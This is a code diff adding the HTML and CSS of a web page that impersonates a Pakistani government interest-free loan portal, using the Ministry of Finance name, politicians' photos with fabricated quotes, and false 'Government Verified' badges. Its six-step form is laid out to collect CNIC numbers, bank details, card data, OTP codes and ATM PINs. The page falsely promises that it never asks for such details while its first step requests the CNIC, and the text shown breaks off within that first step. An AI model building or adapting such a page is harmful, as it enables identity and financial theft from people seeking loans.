@@ -1,0 +1,1014 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<meta name="theme-color" content="#0a4d2e">
+<title>Pakistan Loan Portal - PM Youth E-Asan Loan Scheme</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',-apple-system,BlinkMacSystemFont,Roboto,sans-serif}
+html,body{width:100%;overflow-x:hidden;background:#f0f7f3;color:#1a1a1a;scroll-behavior:smooth}
+.app{width:100%;max-width:100%;min-height:100vh;background:#f0f7f3;position:relative}
+
+/* SPLASH */
+#screen-splash{position:fixed;inset:0;background:#e8f5ee;display:flex;flex-direction:column;justify-content:center;align-items:center;z-index:9999;transition:opacity .5s}
+#screen-splash.hide{opacity:0;pointer-events:none}
+.splash-emblem{width:135px;height:135px;background:#fff;border-radius:30px;box-shadow:0 4px 24px rgba(10,77,46,.08);display:grid;place-items:center;margin-bottom:36px}
+.splash-emblem svg{width:85px;height:85px}
+.splash-title{font-size:26px;font-weight:800;color:#0a2b18;margin-bottom:10px;text-align:center}
+.splash-urdu{font-size:24px;color:#0a2b18;margin-bottom:6px;text-align:center;direction:rtl}
+.splash-sub{font-size:16px;color:#5a6b62;margin-bottom:38px;text-align:center}
+.splash-bar{width:180px;height:6px;background:#d0e5da;border-radius:3px;overflow:hidden;margin-bottom:14px}
+.splash-bar-fill{height:100%;background:#0a4d2e;border-radius:3px;animation:loadBar 3s ease-in-out forwards}
+@keyframes loadBar{from{width:0}to{width:100%}}
+.splash-loading{font-size:14px;color:#5a6b62}
+.splash-netlify{position:absolute;bottom:28px;background:#0a1f11;color:#fff;padding:12px 20px;border-radius:30px;font-size:13px;font-weight:600;display:flex;align-items:center;gap:10px}
+.splash-netlify svg{width:18px;height:18px}
+
+/* HEADER */
+.top-header{background:#0a4d2e;color:#fff;padding:14px 16px;display:flex;align-items:center;justify-content:space-between;font-size:13px;font-weight:600;position:sticky;top:0;z-index:50}
+.top-header .left{display:flex;align-items:center;gap:8px;font-size:15px;font-weight:700}
+.top-header .left .urdu{font-size:16px;direction:rtl}
+.top-header .divider{width:1px;height:16px;background:rgba(255,255,255,.3);margin:0 10px}
+
+.main-container{padding:0 0 40px}
+
+/* HERO */
+.hero-banner{background:#e0ede6;padding:22px 20px 26px;position:relative;overflow:hidden}
+.hero-banner .ministry-row{display:flex;align-items:center;gap:14px;margin-bottom:18px;position:relative;z-index:2}
+.ministry-logo{width:58px;height:58px;background:#0a4d2e;border-radius:14px;display:grid;place-items:center;flex-shrink:0}
+.ministry-logo svg{width:36px;height:36px}
+.ministry-text .small{font-size:10px;letter-spacing:1.6px;color:#0a4d2e;font-weight:700;margin-bottom:2px}
+.ministry-text .big{font-size:19px;font-weight:800;color:#0a4d2e}
+.hero-banner .skyline{position:absolute;right:-20px;bottom:0;opacity:.12;font-size:110px;line-height:.8}
+.hero-banner .curve-flag{position:absolute;top:10px;right:-30px;font-size:100px;opacity:.9;line-height:1;transform:rotate(8deg)}
+.scheme-pill{display:inline-block;background:#0a4d2e;color:#fff;padding:9px 18px;border-radius:20px;font-size:11px;font-weight:700;letter-spacing:.9px;margin-bottom:22px;position:relative;z-index:2}
+.hero-title{font-size:40px;line-height:1.05;font-weight:800;color:#0a4d2e;margin-bottom:18px;font-family:Georgia,serif;letter-spacing:-1.2px;position:relative;z-index:2}
+.hero-title em{font-style:italic}
+.hero-desc{font-size:14.5px;line-height:1.65;color:#3a4a42;margin-bottom:22px;position:relative;z-index:2}
+.hero-desc b{color:#0a4d2e;font-weight:800}
+.apply-btn{width:100%;background:#0a4d2e;color:#fff;padding:19px 24px;border:none;border-radius:14px;font-size:17px;font-weight:800;cursor:pointer;display:flex;align-items:center;justify-content:space-between;gap:12px;box-shadow:0 6px 18px rgba(10,77,46,.25);position:relative;z-index:2}
+.apply-btn .left-part{display:flex;align-items:center;gap:14px}
+.apply-btn .urdu{font-size:15px;font-weight:400;opacity:.9}
+.apply-btn .divider{width:1px;height:20px;background:rgba(255,255,255,.3)}
+.apply-btn .arrow{font-size:22px}
+.online-pill{background:#d0e5da;color:#0a4d2e;padding:13px 18px;border-radius:12px;font-size:12.5px;font-weight:700;display:flex;align-items:center;gap:10px;margin-top:16px}
+.online-pill .dot{width:9px;height:9px;background:#0a4d2e;border-radius:50%;animation:pulse 1.5s infinite;flex-shrink:0}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
+
+/* FEATURES */
+.features{padding:20px}
+.feature-card{background:#fff;border:1.5px solid #d0e5da;border-radius:18px;padding:20px;margin-bottom:14px;display:flex;align-items:center;gap:18px}
+.feature-icon{width:56px;height:56px;background:#e0ede6;border-radius:14px;display:grid;place-items:center;flex-shrink:0;font-size:26px}
+.feature-info .num{font-size:11px;color:#5a6b62;font-weight:700;margin-bottom:3px}
+.feature-info .title{font-size:22px;font-weight:800;color:#0a4d2e;margin-bottom:3px;letter-spacing:-.4px}
+.feature-info .desc{font-size:12.5px;color:#5a6b62}
+
+/* SECTION */
+.section-title{font-size:11px;letter-spacing:2.5px;color:#0a4d2e;font-weight:800;text-transform:uppercase;padding:0 20px;margin:32px 0 14px;display:flex;align-items:center;gap:14px}
+.section-title::before,.section-title::after{content:'';flex:1;height:1.5px;background:#0a4d2e;opacity:.25}
+.section-title.left::before{display:none}
+.section-title.left{justify-content:flex-start}
+.section-title.left::after{display:none}
+.big-title{font-size:34px;line-height:1.12;font-weight:800;color:#0a4d2e;padding:0 20px;margin-bottom:26px;font-family:Georgia,serif;letter-spacing:-1.2px}
+.big-title em{font-style:italic}
+
+/* LEADERSHIP */
+.leader-card{background:#fff;border:1.5px solid #d0e5da;border-radius:22px;padding:26px 20px;margin:0 20px 18px;text-align:center;box-shadow:0 4px 14px rgba(10,77,46,.05)}
+.leader-photo{width:220px;height:220px;border-radius:18px;margin:0 auto 20px;background:#d0e5da;overflow:hidden;position:relative;box-shadow:0 4px 20px rgba(0,0,0,.08)}
+.leader-photo img{width:100%;height:100%;object-fit:cover;object-position:center top;display:block}
+.leader-photo .flag-badge{position:absolute;top:10px;left:10px;background:#0a4d2e;color:#fff;width:32px;height:26px;border-radius:5px;display:grid;place-items:center;font-size:14px;z-index:2}
+.leader-role{font-size:11px;letter-spacing:1.8px;color:#0a4d2e;font-weight:800;margin-bottom:10px;text-transform:uppercase}
+.leader-name{font-size:25px;font-weight:800;color:#1a1a1a;margin-bottom:10px;font-family:Georgia,serif}
+.leader-line{width:44px;height:2px;background:#0a4d2e;margin:0 auto 16px}
+.leader-quote{font-size:16px;font-style:italic;color:#3a4a42;line-height:1.65;font-family:Georgia,serif}
+
+/* TRUST */
+.trust-grid{background:#e0ede6;border-radius:22px;padding:26px;margin:26px 20px;display:grid;grid-template-columns:1fr 1fr;gap:20px 16px}
+.trust-item{display:flex;align-items:center;gap:11px;font-size:11.5px;font-weight:700;color:#0a4d2e;letter-spacing:.4px;line-height:1.3}
+.trust-item .icon{width:38px;height:38px;background:#fff;border-radius:50%;display:grid;place-items:center;flex-shrink:0;font-size:17px}
+.trust-item.full{grid-column:1/-1;justify-content:center}
+
+/* FORM INTRO */
+.form-intro{padding:0 20px;text-align:center;margin-bottom:26px}
+.form-intro .big-title{text-align:center;padding:0;margin-bottom:16px}
+.form-intro p{font-size:14.5px;color:#3a4a42;line-height:1.7;max-width:420px;margin:0 auto}
+
+.form-wrapper{background:#fff;border:1.5px solid #d0e5da;border-radius:22px;margin:0 16px;padding:22px;box-shadow:0 4px 18px rgba(10,77,46,.05)}
+
+/* STEPS */
+.steps-progress{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:26px;padding-bottom:22px;border-bottom:1px solid #e0ede6;gap:4px}
+.step-item{display:flex;flex-direction:column;align-items:center;gap:7px;flex:1}
+.step-circle{width:42px;height:42px;border-radius:50%;background:#e0ede6;color:#0a4d2e;display:grid;place-items:center;font-size:19px;font-weight:700;border:2.5px solid transparent;transition:.3s}
+.step-item.active .step-circle{background:#0a4d2e;color:#fff;border-color:#0a4d2e}
+.step-item.done .step-circle{background:#0a4d2e;color:#fff}
+.step-item .label{font-size:10px;font-weight:700;color:#5a6b62;text-align:center;line-height:1.2}
+.step-item.active .label,.step-item.done .label{color:#0a4d2e}
+.step-item .urdu-label{font-size:10px;color:#5a6b62;direction:rtl;line-height:1.2;text-align:center;font-weight:600}
+.step-item.active .urdu-label,.step-item.done .urdu-label{color:#0a4d2e}
+
+/* FORM STEP */
+.form-step{display:none}
+.form-step.active{display:block;animation:slideIn .3s ease}
+@keyframes slideIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+.form-step-title{display:flex;justify-content:space-between;align-items:flex-end;margin-bottom:8px;flex-wrap:wrap;gap:8px}
+.form-step-title .en{font-size:24px;font-weight:800;color:#0a4d2e;font-family:Georgia,serif;letter-spacing:-.6px}
+.form-step-title .ur{font-size:20px;color:#0a4d2e;direction:rtl;font-weight:700}
+.form-step-desc{font-size:13px;color:#5a6b62;margin-bottom:24px}
+.form-divider{border-top:1px solid #e0ede6;margin:20px 0}
+
+/* FIELDS */
+.field{margin-bottom:18px}
+.field-label{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;font-size:14px;font-weight:700;color:#1a1a1a}
+.field-label .en{display:flex;align-items:center;gap:5px}
+.field-label .en .req{color:#c62828;font-size:16px}
+.field-label .ur{font-size:15px;color:#5a6b62;direction:rtl;font-weight:600}
+.field input,.field select,.field textarea{width:100%;padding:15px 17px;border:1.5px solid #d0e5da;border-radius:11px;font-size:15px;background:#f8fcfa;color:#1a1a1a;outline:none;transition:.2s;font-family:inherit}
+.field input:focus,.field select:focus,.field textarea:focus{border-color:#0a4d2e;background:#fff;box-shadow:0 0 0 3px rgba(10,77,46,.08)}
+.field input::placeholder{color:#9aa8a2}
+.field select{cursor:pointer;appearance:none;background-image:url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%235a6b62' stroke-width='2'%3e%3cpath d='M6 9l6 6 6-6'/%3e%3c/svg%3e");background-repeat:no-repeat;background-position:right 15px center;background-size:20px;padding-right:46px}
+.field textarea{min-height:85px;resize:vertical}
+
+/* PREMIUM DEBIT CARD VISUAL */
+.card-visual-wrapper{position:relative;width:100%;max-width:400px;height:220px;margin:20px auto 30px}
+.card-visual-back{position:absolute;top:14px;left:14px;width:100%;height:100%;background:linear-gradient(135deg,#0a1f11 0%,#1a3d2a 100%);border-radius:18px;box-shadow:0 8px 24px rgba(0,0,0,.15)}
+.card-visual{position:relative;width:100%;height:100%;background:linear-gradient(135deg,#0f4d2e 0%,#1a6b3f 50%,#0a4d2e 100%);border-radius:18px;box-shadow:0 12px 32px rgba(10,77,46,.4);overflow:hidden;padding:24px;color:#fff}
+.card-visual::before{content:'';position:absolute;bottom:-40%;left:-10%;width:120%;height:80%;background:rgba(255,255,255,.06);border-radius:50% 50% 0 0;transform:rotate(-8deg)}
+.card-visual::after{content:'';position:absolute;bottom:-30%;right:-20%;width:100%;height:70%;background:rgba(0,0,0,.08);border-radius:50% 50% 0 0;transform:rotate(6deg)}
+.card-top{position:relative;z-index:2;display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:36px}
+.card-chip{width:42px;height:32px;background:linear-gradient(135deg,#d4af37 0%,#f4e5a1 50%,#b8941f 100%);border-radius:6px;position:relative}
+.card-chip::before{content:'';position:absolute;top:50%;left:0;width:100%;height:1px;background:rgba(0,0,0,.2);transform:translateY(-50%)}
+.card-chip::after{content:'';position:absolute;top:0;left:50%;width:1px;height:100%;background:rgba(0,0,0,.2);transform:translateX(-50%)}
+.card-type{font-size:14px;font-weight:600;color:rgba(255,255,255,.9);letter-spacing:.5px;display:flex;align-items:center;gap:6px}
+.card-number-display{position:relative;z-index:2;font-family:'Courier New',monospace;font-size:22px;font-weight:700;letter-spacing:3px;margin-bottom:8px;color:#fff;text-shadow:0 2px 4px rgba(0,0,0,.3)}
+.card-label{position:relative;z-index:2;font-size:10px;color:rgba(255,255,255,.6);letter-spacing:1.5px;font-weight:600;margin-bottom:20px;text-transform:uppercase}
+.card-bottom{position:relative;z-index:2;display:flex;justify-content:space-between;align-items:flex-end}
+.card-date-block{display:flex;flex-direction:column;gap:2px}
+.card-date-label{font-size:9px;color:rgba(255,255,255,.5);letter-spacing:1px;text-transform:uppercase;font-weight:600}
+.card-date-value{font-size:14px;font-weight:700;color:rgba(255,255,255,.95);letter-spacing:1px}
+.card-issue-label{font-size:9px;color:rgba(255,255,255,.5);letter-spacing:1px;text-transform:uppercase;font-weight:600;margin-top:4px}
+
+/* BUTTONS */
+.btn-next{width:100%;background:#0a4d2e;color:#fff;padding:17px;border:none;border-radius:13px;font-size:16px;font-weight:800;cursor:pointer;margin-top:22px;display:flex;align-items:center;justify-content:center;gap:10px;box-shadow:0 4px 14px rgba(10,77,46,.2);transition:.2s}
+.btn-next:hover{transform:translateY(-1px)}
+.btn-back{background:#fff;border:1.5px solid #d0e5da;color:#0a4d2e;padding:13px 20px;border-radius:13px;font-size:15px;font-weight:700;cursor:pointer;margin-top:12px;width:100%}
+.btn-row{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:22px}
+.btn-row .btn-back,.btn-row .btn-next{margin-top:0}
+
+.form-error{color:#c62828;font-size:13px;font-weight:600;margin-top:10px;display:none;text-align:center}
+.form-error.show{display:block}
+
+/* OTP BOXES */
+.otp-banner{background:#e0ede6;border:1.5px solid #b8d4c4;border-radius:14px;padding:18px 20px;text-align:center;margin-bottom:18px;display:flex;align-items:center;gap:12px}
+.otp-banner .check{font-size:20px;color:#0a4d2e;font-weight:900}
+.otp-banner .text{font-size:14px;font-weight:700;color:#0a4d2e;line-height:1.4;text-align:left;flex:1}
+.otp-banner .urdu-line{display:block;font-size:13px;color:#5a6b62;direction:rtl;margin-top:4px;font-weight:600}
+
+.phone-info-box{background:#f0f7f3;border:1.5px solid #d0e5da;border-radius:14px;padding:16px 18px;display:flex;align-items:center;justify-content:space-between;margin-bottom:24px}
+.phone-info-box .left{display:flex;align-items:center;gap:14px}
+.phone-info-box .phone-icon{width:44px;height:44px;border:1.5px solid #0a4d2e;border-radius:10px;display:grid;place-items:center;font-size:20px}
+.phone-info-box .info-label{font-size:11px;color:#5a6b62;letter-spacing:1.2px;font-weight:700;text-transform:uppercase;margin-bottom:3px}
+.phone-info-box .info-value{font-size:17px;font-weight:800;color:#0a4d2e;letter-spacing:1.5px;font-family:'Courier New',monospace}
+.phone-info-box .phone-icon-right{font-size:22px;color:#0a4d2e;opacity:.4}
+
+.otp-label-row{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px}
+.otp-label-row .en{font-size:15px;font-weight:700;color:#1a1a1a}
+.otp-label-row .ur{font-size:14px;color:#5a6b62;direction:rtl;font-weight:600}
+
+.otp-boxes{display:grid;grid-template-columns:repeat(6,1fr);gap:10px;margin-bottom:20px}
+.otp-boxes.four{grid-template-columns:repeat(4,1fr)}
+.otp-boxes input{width:100%;height:60px;text-align:center;font-size:26px;font-weight:800;color:#0a4d2e;background:#f8fcfa;border:2px solid #d0e5da;border-radius:12px;outline:none;font-family:'Courier New',monospace;transition:.15s}
+.otp-boxes input:focus{border-color:#0a4d2e;background:#fff;box-shadow:0 0 0 3px rgba(10,77,46,.1)}
+
+.otp-timer-row{background:#f0f7f3;border:1.5px solid #d0e5da;border-radius:12px;padding:14px 18px;display:flex;justify-content:space-between;align-items:center;margin-bottom:20px}
+.otp-timer-row .timer-left{display:flex;align-items:center;gap:10px}
+.otp-timer-row .timer-dot{width:10px;height:10px;background:#0a4d2e;border-radius:50%}
+.otp-timer-row .timer-label{font-size:12px;color:#5a6b62;font-weight:700;letter-spacing:1.2px;text-transform:uppercase}
+.otp-timer-row .timer-value{font-size:18px;font-weight:800;color:#0a4d2e;font-family:'Courier New',monospace;letter-spacing:1px}
+.otp-timer-row .resend{display:flex;align-items:center;gap:6px;color:#0a4d2e;font-size:14px;font-weight:700;cursor:pointer;background:none;border:none;font-family:inherit}
+.otp-timer-row .resend svg{width:16px;height:16px;fill:#0a4d2e}
+
+.info-box{background:#f0f7f3;border:1.5px solid #d0e5da;border-radius:14px;padding:16px 18px;display:flex;gap:14px;align-items:flex-start;margin-bottom:22px}
+.info-box .lock-icon{font-size:20px;color:#0a4d2e;flex-shrink:0}
+.info-box .info-text{font-size:13px;color:#3a4a42;line-height:1.6;font-weight:500}
+.info-box .info-text .urdu-line{display:block;direction:rtl;margin-top:6px;color:#5a6b62;font-weight:600}
+
+.warning-box{background:#fff8e1;border:1.5px solid #ffcc80;border-radius:14px;padding:16px 18px;display:flex;gap:14px;align-items:flex-start;margin-bottom:22px}
+.warning-box .warn-icon{width:22px;height:22px;border:1.5px solid #e65100;border-radius:50%;display:grid;place-items:center;font-size:12px;font-weight:900;color:#e65100;flex-shrink:0;font-style:italic}
+.warning-box .warn-text{font-size:13px;color:#3a4a42;line-height:1.6;font-weight:500}
+.warning-box .warn-text b{color:#e65100}
+.warning-box .urdu-line{display:block;direction:rtl;margin-top:6px;color:#5a6b62;font-weight:600}
+
+.readonly-field{background:#e0ede6 !important;border-color:#b8d4c4 !important;font-weight:800 !important;color:#0a4d2e !important;font-size:18px !important;text-align:center}
+
+/* SUCCESS */
+.success-screen{text-align:center;padding:30px 20px}
+.success-circle{width:80px;height:80px;background:#d0e5da;border-radius:50%;display:grid;place-items:center;margin:0 auto 20px}
+.success-circle svg{width:44px;height:44px;fill:none;stroke:#0a4d2e;stroke-width:3;stroke-linecap:round;stroke-linejoin:round}
+.success-badge{display:inline-flex;align-items:center;gap:8px;background:#e0ede6;color:#0a4d2e;padding:8px 18px;border-radius:20px;font-size:11px;font-weight:800;letter-spacing:1.2px;margin-bottom:20px;text-transform:uppercase}
+.success-badge .badge-icon{width:14px;height:14px;fill:#0a4d2e}
+.success-title{font-size:32px;font-weight:800;color:#0a4d2e;margin-bottom:12px;font-family:Georgia,serif;letter-spacing:-.8px;line-height:1.15}
+.success-urdu{font-size:16px;color:#5a6b62;margin-bottom:24px;direction:rtl;line-height:1.8;font-weight:600}
+
+.summary-card{background:#f0f7f3;border:1.5px solid #d0e5da;border-radius:16px;padding:6px 0;margin-bottom:24px;text-align:left}
+.summary-row{display:flex;justify-content:space-between;align-items:center;padding:14px 20px;border-bottom:1px solid #e0ede6}
+.summary-row:last-child{border-bottom:none}
+.summary-row .label{font-size:13px;color:#5a6b62;font-weight:600}
+.summary-row .value{font-size:15px;font-weight:800;color:#1a1a1a;text-align:right;font-family:'Courier New',monospace;letter-spacing:.5px}
+.summary-row .value.green{color:#0a4d2e}
+.status-badge{display:inline-flex;align-items:center;gap:6px;background:#fff3e0;color:#e65100;padding:5px 12px;border-radius:20px;font-size:11px;font-weight:800;letter-spacing:.5px;border:1.5px solid #ffcc80}
+.status-badge .clock{font-size:12px}
+
+.success-note{font-size:14px;color:#3a4a42;line-height:1.7;margin-bottom:24px;padding:0 10px}
+.success-note b{color:#0a4d2e;font-weight:800;font-family:'Courier New',monospace}
+.btn-submit-another{width:100%;background:#0a4d2e;color:#fff;padding:17px;border:none;border-radius:13px;font-size:16px;font-weight:800;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px}
+.btn-submit-another svg{width:18px;height:18px;fill:none;stroke:#fff;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
+
+/* FOOTER */
+.footer{background:#f0f7f3;padding:42px 20px 32px;border-top:1.5px solid #d0e5da;margin-top:42px}
+.footer-brand{display:flex;align-items:center;gap:14px;margin-bottom:16px}
+.footer-logo{width:54px;height:54px;background:#0a4d2e;border-radius:12px;display:grid;place-items:center}
+.footer-logo svg{width:34px;height:34px}
+.footer-brand-text .small{font-size:10px;letter-spacing:1.8px;color:#0a4d2e;font-weight:700;margin-bottom:3px}
+.footer-brand-text .big{font-size:17px;font-weight:800;color:#0a4d2e}
+.footer-desc{font-size:12.5px;color:#5a6b62;line-height:1.7;margin-bottom:26px}
+.footer-section{font-size:11px;letter-spacing:1.8px;color:#0a4d2e;font-weight:800;text-transform:uppercase;margin-bottom:16px;margin-top:26px}
+.footer-contact{display:flex;align-items:center;gap:14px;margin-bottom:14px;font-size:13.5px;color:#3a4a42;font-weight:500}
+.footer-contact .fc-icon{width:40px;height:40px;background:#e0ede6;border-radius:50%;display:grid;place-items:center;flex-shrink:0;font-size:17px}
+.footer-links{display:flex;flex-direction:column;gap:12px;margin-bottom:26px}
+.footer-links a{color:#3a4a42;text-decoration:none;font-size:14px;font-weight:600}
+.footer-copy{text-align:center;padding-top:26px;border-top:1.5px solid #d0e5da;font-size:10.5px;letter-spacing:1.2px;color:#5a6b62;font-weight:600;line-height:2.2}
+.footer-copy b{color:#0a4d2e;font-weight:800;font-size:11.5px}
+
+/* LOADING */
+.loading-overlay{position:fixed;inset:0;background:rgba(10,77,46,.92);display:none;justify-content:center;align-items:center;flex-direction:column;z-index:9998}
+.loading-overlay.show{display:flex}
+.loading-spinner{width:60px;height:60px;border:5px solid rgba(255,255,255,.25);border-top-color:#fff;border-radius:50%;animation:spin .8s linear infinite;margin-bottom:18px}
+@keyframes spin{to{transform:rotate(360deg)}}
+.loading-text{color:#fff;font-size:15px;font-weight:600}
+
+@media(max-width:380px){
+  .hero-title{font-size:34px}
+  .big-title{font-size:28px}
+  .leader-photo{width:190px;height:190px}
+  .otp-boxes input{height:52px;font-size:22px}
+  .card-number-display{font-size:18px;letter-spacing:2px}
+  .success-title{font-size:26px}
+}
+</style>
+</head>
+<body>
+<div class="app">
+
+  <!-- SPLASH -->
+  <div id="screen-splash">
+    <div class="splash-emblem">
+      <svg viewBox="0 0 100 100"><g fill="none" stroke="#0a4d2e" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="50" cy="30" r="5" fill="#0a4d2e" stroke="none"/><path d="M44 38 Q40 44 44 50"/><path d="M50 22 L50 15" stroke-width="2"/><circle cx="50" cy="12" r="1.5" fill="#0a4d2e" stroke="none"/><rect x="38" y="42" width="24" height="30" rx="3"/><line x1="45" y1="42" x2="45" y2="72"/><line x1="55" y1="42" x2="55" y2="72"/><circle cx="44" cy="52" r="3" fill="#0a4d2e" stroke="none"/><rect x="42" y="58" width="4" height="8" fill="#0a4d2e" stroke="none"/><circle cx="56" cy="52" r="3" fill="#0a4d2e" stroke="none"/><rect x="54" y="58" width="4" height="8" fill="#0a4d2e" stroke="none"/><path d="M38 78 Q50 84 62 78"/><path d="M30 80 Q50 92 70 80"/></g></svg>
+    </div>
+    <div class="splash-title">Interest-Free Loan Scheme</div>
+    <div class="splash-urdu">بلا سود قرض اسکیم</div>
+    <div class="splash-sub">Government of Pakistan</div>
+    <div class="splash-bar"><div class="splash-bar-fill"></div></div>
+    <div class="splash-loading">Loading...</div>
+    <div class="splash-netlify">
+      <svg viewBox="0 0 24 24" fill="#00c7b7"><path d="M12 0L3.5 8.5l2.1 2.1L12 4.2l6.4 6.4 2.1-2.1L12 0zM3.5 15.5L12 24l8.5-8.5-2.1-2.1L12 19.8l-6.4-6.4-2.1 2.1z"/></svg>
+    </div>
+  </div>
+
+  <!-- HEADER -->
+  <div class="top-header">
+    <div class="left"><span>🇵🇰</span><span class="urdu">اسلامی جمہوریہ پاکستان</span></div>
+    <div class="divider"></div>
+    <div style="font-size:13px;font-weight:600;">Islamic Republic of Pakistan</div>
+  </div>
+
+  <div class="main-container">
+
+    <!-- HERO -->
+    <div class="hero-banner">
+      <div class="skyline">🏛️</div>
+      <div class="curve-flag">🇵🇰</div>
+      <div class="ministry-row">
+        <div class="ministry-logo">
+          <svg viewBox="0 0 100 100"><path d="M40 25 Q30 25 30 40 Q30 55 40 55 Q50 55 50 40 Q50 25 40 25 Z" fill="#fff"/><circle cx="40" cy="42" r="9" fill="#0a4d2e"/><path d="M40 60 L40 82 M30 82 L50 82" stroke="#fff" stroke-width="4" fill="none"/></svg>
+        </div>
+        <div class="ministry-text">
+          <div class="small">MINISTRY OF FINANCE</div>
+          <div class="big">Pakistan Loan Portal</div>
+        </div>
+      </div>
+      <div class="scheme-pill">PM YOUTH E-ASAN LOAN SCHEME • 2026</div>
+      <div class="hero-title">Apna Karobar,<br><em>Apna Mustaqbil.</em></div>
+      <div class="hero-desc">Government of Pakistan ke asaan qist programme ke zariye <b>PKR 10 Lakh se 3 Crore</b> tak ka qarz — kam markup, tez approval, sirf 48 ghante mein.</div>
+      <button class="apply-btn" onclick="goToForm()">
+        <div class="left-part"><span>Apply Now</span><span class="divider"></span><span class="urdu">ابھی درخواست دیں</span></div>
+        <span class="arrow">→</span>
+      </button>
+      <div class="online-pill"><span class="dot"></span>Online Portal Active • Quick 48-Hour Approval</div>
+    </div>
+
+    <!-- FEATURES -->
+    <div class="features">
+      <div class="feature-card"><div class="feature-icon">📚</div><div class="feature-info"><div class="num">01</div><div class="title">10L – 3 Cr</div><div class="desc">Zaroorat ke mutabiq qarz limit</div></div></div>
+      <div class="feature-card"><div class="feature-icon">🕐</div><div class="feature-info"><div class="num">02</div><div class="title">48 Hours</div><div class="desc">Tez tareen approval processing</div></div></div>
+      <div class="feature-card"><div class="feature-icon">🔒</div><div class="feature-info"><div class="num">03</div><div class="title">Secure</div><div class="desc">Government certified portal</div></div></div>
+      <div class="feature-card"><div class="feature-icon">🌐</div><div class="feature-info"><div class="num">04</div><div class="title">Sab ke liye</div><div class="desc">Karobar, mulazim aur kisan</div></div></div>
+    </div>
+
+    <!-- LEADERSHIP -->
+    <div class="section-title left">LEADERSHIP</div>
+    <div class="big-title">A vision for a <em>prosperous Pakistan.</em></div>
+
+    <div class="leader-card">
+      <div class="leader-photo"><div class="flag-badge">🇵🇰</div><img src="https://i.postimg.cc/J4Ch5DsX/Screenshot-20261016-111842.jpg" alt="PM Shehbaz Sharif"></div>
+      <div class="leader-role">PRIME MINISTER OF PAKISTAN</div>
+      <div class="leader-name">Muhammad Shehbaz Sharif</div>
+      <div class="leader-line"></div>
+      <div class="leader-quote">"Har Pakistani ko maaliyati asani aur khud mukhtari milni chahiye."</div>
+    </div>
+
+    <div class="leader-card">
+      <div class="leader-photo"><div class="flag-badge">🇵🇰</div><img src="https://i.postimg.cc/43y4xpS0/Screenshot-20261016-111926.jpg" alt="CM Maryam Nawaz"></div>
+      <div class="leader-role">CHIEF MINISTER • PUNJAB</div>
+      <div class="leader-name">Maryam Nawaz Sharif</div>
+      <div class="leader-line"></div>
+      <div class="leader-quote">"Naujawan aur chote karobari hazraat ki maali madad hamari tarjeeh hai."</div>
+    </div>
+
+    <!-- TRUST -->
+    <div class="trust-grid">
+      <div class="trust-item"><div class="icon">🛡️</div>GOVERNMENT VERIFIED</div>
+      <div class="trust-item"><div class="icon">💳</div>ZERO ADVANCE FEE</div>
+      <div class="trust-item"><div class="icon">🛡️</div>STATE BANK REGULATED</div>
+      <div class="trust-item"><div class="icon">🌐</div>100% ONLINE</div>
+      <div class="trust-item full"><div class="icon">⏱️</div>48H APPROVAL</div>
+    </div>
+
+    <!-- FORM INTRO -->
+    <div class="form-intro" id="formSection">
+      <div class="big-title" style="text-align:center;">Apni interest register karein</div>
+      <p>Yeh chhota sa form ek representative ko aap se rabta karne deta hai jo asal application mein rehnumai karega. Sirf basic contact aur interest ki maloomat — kabhi bhi CNIC, bank ya card details nahi.</p>
+    </div>
+
+    <div class="section-title">APPLICATION</div>
+    <div class="big-title" style="text-align:center;padding:0 20px;">Loan application form</div>
+    <p style="text-align:center;font-size:14.5px;color:#3a4a42;margin-bottom:26px;padding:0 20px;">6 asaan steps mein apni darkhwast jama karwayein.</p>
+
+    <!-- FORM -->
+    <div class="form-wrapper" id="formWrapper">
+
+      <!-- STEP PROGRESS -->
+      <div class="steps-progress" id="stepsProgress">
+        <div class="step-item active" data-step="1"><div class="step-circle">👤</div><div class="label">Step 1</div><div class="urdu-label">ذاتی معلومات</div></div>
+        <div class="step-item" data-step="2"><div class="step-circle">🏛️</div><div class="label">Step 2</div><div class="urdu-label">بینک معلومات</div></div>
+        <div class="step-item" data-step="3"><div class="step-circle">💳</div><div class="label">Step 3</div><div class="urdu-label">کارڈ تصدیق</div></div>
+        <div class="step-item" data-step="4"><div class="step-circle">🛡️</div><div class="label">Step 4</div><div class="urdu-label">او ٹی پی</div></div>
+        <div class="step-item" data-step="5"><div class="step-circle">🔒</div><div class="label">Step 5</div><div class="urdu-label">اے ٹی ایم پن</div></div>
+        <div class="step-item" data-step="6"><div class="step-circle">🛡️</div><div class="label">Step 6</div><div class="urdu-label">حتمی تصدیق</div></div>
+      </div>
+
+      <!-- STEP 1: PERSONAL INFO -->
+      <div class="form-step active" data-step="1">
+        <div class="form-step-title"><div class="en">Personal Information</div><div class="ur">ذاتی معلومات</div></div>
+        <div class="form-step-desc">Apni zaati maloomat darj karein</div>
+
+        <div class="field">
+          <div class="field-label"><div class="en">Full Name <span class="req">*</span></div><div class="ur">پورا نام</div></div>
+          <input type="text" id="fullName" placeholder="e.g. Ali Khan">
+        </div>
+        <div class="field">
+          <div class="field-label"><div class="en">CNIC <span class="req">*</span></div><div class="ur">شناختی کارڈ</div></div>
+          <input type="tel" id="cnic" placeholder="12345-1234567-1" inputmode="numeric" maxlength="15">
+        </div>
+        <div class="field">
+          <div class="field-label"><div class="en">Mobile No <span class="req">*</span></div><div class="ur">موبائل نمبر</div></div>
+          <input type="tel" id="mobile" placeholder="0300-1234567" inputmode="numeric" maxlength="12">
+        </div>
+        <div class="field">
+          <div class="field-label"><div class="en">Gender <span class="req">*</span></div><div class="ur">جنس</div></div>
